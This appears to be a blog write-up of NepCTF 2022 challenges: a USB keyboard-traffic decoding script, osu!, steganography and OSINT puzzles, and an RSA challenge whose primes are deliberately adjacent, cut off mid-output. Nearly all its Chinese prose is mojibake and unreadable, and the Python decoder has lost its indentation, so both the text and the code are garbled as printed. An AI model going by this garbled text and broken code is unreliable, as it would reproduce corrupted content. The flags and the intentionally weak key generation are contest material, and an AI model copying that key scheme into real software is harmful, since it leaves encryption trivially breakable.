    <content type="html"><![CDATA[<p>â€‹    </p><p>â€œNepCTF 2022â€æ˜¯ç”±Nepnepè”åˆç«™é˜Ÿä¸»åŠçš„å…¬ç›Šæ‹›æ–°èµ›äº‹ï¼Œæ—¨åœ¨ä»¥æœ‰ä»£è¡¨æ€§ã€æœ‰ç‰¹è‰²çš„é¢˜ç›®åŸ¹å…»æ–°ç”Ÿç½‘ç»œå®‰å…¨èƒ½åŠ›ã€‚</p><p>æ¯”èµ›æ—¶é—´ï¼š2022å¹´7æœˆ15æ—¥10:00 - 2022å¹´7æœˆ17æ—¥10:00ã€‚</p><p>æ¯”èµ›å½¢å¼ï¼šä¸ªäººè§£é¢˜èµ›</p><p>æ¯”èµ›é“¾æ¥ï¼š<a href="http://nep.lemonprefect.cn/">http://nep.lemonprefect.cn/</a></p><p>æ¯”èµ›å¹³å°ï¼šPower by CTFm</p><p>NepCTF 2022èµ›äº‹è¯´æ˜æ–‡æ¡£ï¼š<a href="https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj">https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj</a></p><p><strong>Rank: 4</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><blockquote><p>æé™å¥—å¨ƒ</p><p>flagæ ¼å¼ä¸ºnepctf{}</p></blockquote><p>jpgä¸­æå–å‡ºzipå‹ç¼©åŒ…ï¼Œzipå‹ç¼©åŒ…å¥—å¨ƒ232å±‚ï¼Œç”¨cyberchef label+jumpå¾ªç¯æå–å‡ºæœ€å†…å±‚çš„pcapæ–‡ä»¶ï¼›</p><p>wiresharkæ‰“å¼€å‘ç°ä¸ºUSBé”®ç›˜æµé‡ï¼Œtsharkå·¥å…·æå–å‡ºusb.capdataæ•°æ®ï¼Œç”¨è„šæœ¬è¿˜åŸé”®ä½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"><span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">  <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"><span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line"><span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line"><span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line"><span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">  <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"><span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line"> <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">del</span> output[a]</span><br><span class="line"><span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">flag+=<span class="number">1</span></span><br><span class="line">output.pop(i)</span><br><span class="line"><span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">output[i]=output[i].upper()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><p>å¾—åˆ° <code>welcometonepctf2nd</code>ï¼ŒåŠ åˆ†éš”ç¬¦å¾—flagï¼š<code>nepctf&#123;welcome_to_nepctf_2nd&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="èŠ±èŠ±ç”»ç”»ç”»èŠ±èŠ±"><a href="#èŠ±èŠ±ç”»ç”»ç”»èŠ±èŠ±" class="headerlink" title="èŠ±èŠ±ç”»ç”»ç”»èŠ±èŠ±"></a>èŠ±èŠ±ç”»ç”»ç”»èŠ±èŠ±</h3><blockquote><p>èŠ±èŠ±ç”»äº†ä¸€å¼ å›¾ï¼Œä½ èƒ½çœ‹å‡ºæ¥å¥¹ç”»çš„æ˜¯ä»€ä¹ˆå—</p><p>(flagæ ¼å¼ä¸ºNepCTF{})</p></blockquote><p>åœ¨ <a href="https://osu.ppy.sh/wiki/zh/Client/File_formats">osu! wiki</a> å¯ä»¥å‘ç°oszæ–‡ä»¶ä¸ºå¯æ‰§è¡Œçš„osu!è°±é¢æ–‡ä»¶ï¼Œä¸‹è½½å®‰è£…osu!ï¼Œ</p><p>æ ¹æ® <code>ç”Ÿæˆçš„ .osz æ–‡ä»¶ä¼šè¢«æ”¾ç½®åœ¨ osu! æ–‡ä»¶å¤¹ä¸‹çš„ &quot;Exports&quot; æ–‡ä»¶å¤¹é‡Œ</code>ï¼Œå°†oszæ–‡ä»¶æ”¾å…¥ <code>Exports</code> æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€osu!ï¼Œ</p><p>åœ¨Edité¡µé¢çœ‹å®Œæ•´é¦–æ­Œæ›²çš„ä¹è°±è½¨è¿¹ï¼Œæ‹¿åˆ°flagï¼š<code>NepCTF&#123;MASTER_OF_åå¥³äººï¼&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="å°‘è§çš„bbbbase"><a href="#å°‘è§çš„bbbbase" class="headerlink" title="å°‘è§çš„bbbbase"></a>å°‘è§çš„bbbbase</h3><blockquote><p>å°‘è§çš„bbbbase</p></blockquote><p>å°è¯•å‡ ç§å¸¸è§jpgéšå†™ï¼Œå‘ç°æ˜¯jphideéšå†™ï¼Œç”¨JPHSå·¥å…·seekï¼ˆæ— å¯†ç ï¼‰ï¼Œå¾—åˆ° <code>KkYWdvCQcLYewSUUy5TtQc9AMa</code></p><p>base58è§£å¾—flagï¼š<code>flag&#123;Real_qiandao~&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="9ç‚¹ç›´æ’­"><a href="#9ç‚¹ç›´æ’­" class="headerlink" title="9ç‚¹ç›´æ’­"></a>9ç‚¹ç›´æ’­</h3><blockquote><p>å„ä½åŒå­¦ï¼Œæ¯”èµ›å·²ç»å¼€å§‹å°†è¿‘åä¸ªå°æ—¶å•¦ï¼Œå¤§å®¶ç©çš„å¦‚ä½•å‘¢ï¼Ÿé‚€è¯·å¤§å®¶9ç‚¹æ¥ç›´æ’­é—´èŠèŠå¤©~ è¯·é”å®š<a href="https://b23.tv/bn0pPAR">https://b23.tv/bn0pPAR</a><br>è¿™è¾¹å°åŠ©æ‰‹æ”¶åˆ°äº†å¤§å®¶æƒ³æš´æ‰“å‡ºé¢˜äººçš„åé¦ˆï¼Œä»Šæ™š9ç‚¹æˆ‘ä»¬è¯·åˆ°äº†å˜æ€çš„å‡ºé¢˜äººä»¬ï¼Œåœ¨ç›´æ’­é—´å’Œå¤§å®¶äº¤æµï¼Œæ”¾å‡ºæˆ‘ä»¬çš„hintï¼Œå¸®åŠ©å¤§å®¶è§£é¢˜ã€‚<br>åŒæ—¶ä¹Ÿä¼šåœ¨ç›´æ’­é—´ä¸­æŠ½å¹¸è¿çš„å°ä¼™ä¼´é€å‡ºæˆ‘ä»¬çš„å‘¨è¾¹ç¤¼å“ã€‚</p></blockquote><p>çœ‹Bç«™ç›´æ’­æ‹¿flagï¼š<code>NepCTF&#123;bad_woman_nb!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="é¦…é¥¼ï¼Ÿé™·é˜±ï¼"><a href="#é¦…é¥¼ï¼Ÿé™·é˜±ï¼" class="headerlink" title="é¦…é¥¼ï¼Ÿé™·é˜±ï¼"></a>é¦…é¥¼ï¼Ÿé™·é˜±ï¼</h3><blockquote><p>å¥½å…„å¼Ÿä¸­å¥–äº†ï¼Œä½†æ˜¯è¦å…ˆæ±‡æ¬¾ã€‚ä»–å»å“ªäº†ï¼Ÿ</p><p>NepCTF{é“¶è¡Œå®˜ç½‘ç½‘å€}</p></blockquote><p>OSINTé¢˜ã€‚</p><p><img src="/2022/07/17/match-NepCTF-2022/image-20220717235016617.png" alt="image-20220717235016617"></p><p>ç”¨Yandexè¯†åˆ«å›¾1é‡Œçš„é»„è‰²å»ºç­‘ï¼Œå¯å¾—åˆ°ç»“æœä¸º<strong>è±ªå¨æµ·æ™¯å¤§é…’åº—</strong>ï¼Œå†åœ¨ç™¾åº¦åœ°å›¾é‡Œæœç´¢åœ¨æµ·å—ä¸‰äºšï¼Œé™„è¿‘é“¶è¡Œä¸º<strong>å…‰å¤§é“¶è¡Œ</strong>ï¼Œ</p><p>å®˜ç½‘ç½‘å€å³flagï¼š<code>NepCTF&#123;www.cebbank.com&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="é—®å·"><a href="#é—®å·" class="headerlink" title="é—®å·"></a>é—®å·</h3><blockquote><p><a href="https://www.wjx.cn/vm/mjlLAVV.aspx">https://www.wjx.cn/vm/mjlLAVV.aspx</a></p></blockquote><p>ç­”é—®å·æš´æ‰“å‡ºé¢˜äººï¼Œæ‹¿flagï¼š<code>NepCTF&#123;see_you_NepCTF_2023&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><blockquote><p>æœ¬é¢˜flagæ ¼å¼: NepCTF{xxx}</p><p>Have you heard of the Chinese Remainder Theorem?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> powmod,is_prime,invert,bit_length, next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>():</span></span><br><span class="line">    (p,q,n,e,d) = (<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    q = next_prime(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#     q = p + 1</span></span><br><span class="line"><span class="comment">#     while(True):</span></span><br><span class="line"><span class="comment">#         q += 2 if q &amp; 1 else 1</span></span><br><span class="line"><span class="comment">#         if is_prime(q, 30):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"></span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    par = (p,q,n,e,d)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> par</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">par, c</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(par) == <span class="number">5</span></span><br><span class="line">    (p,q,n,e,d) = par</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here&#x27;s something for you.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c_mod_p =&quot;</span>,c % p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c_mod_q =&quot;</span>,c % q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">message, par</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(par) == <span class="number">5</span></span><br><span class="line">    (p,q,n,e,d) = par</span><br><span class="line"></span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line"></span><br><span class="line">    c = powmod(m,e,n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    par = gen_key()</span><br><span class="line">    c = enc(flag, par)</span><br><span class="line">    leak(par, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Here&#x27;s something for you.</span></span><br><span class="line"><span class="string">n = 19955580242010925349026385826277356862322608500430230515928936214328341334162349408990409245298441768036250429913772953915537485025323789254947881868366911379717813713406996010824562645958646441589124825897348626601466594149743648589703323284919806371555688798726766034226044561171215392728880842964598154362131942585577722616354074267803330013886538511795383890371097812191816934883393255463554256887559394146851379087386846398690114807642170885445050850978579391063585254346364297374019309370189128443081285875218288166996242359495992824824109894071316525623741755423467173894812627595135675814789191820979950786791</span></span><br><span 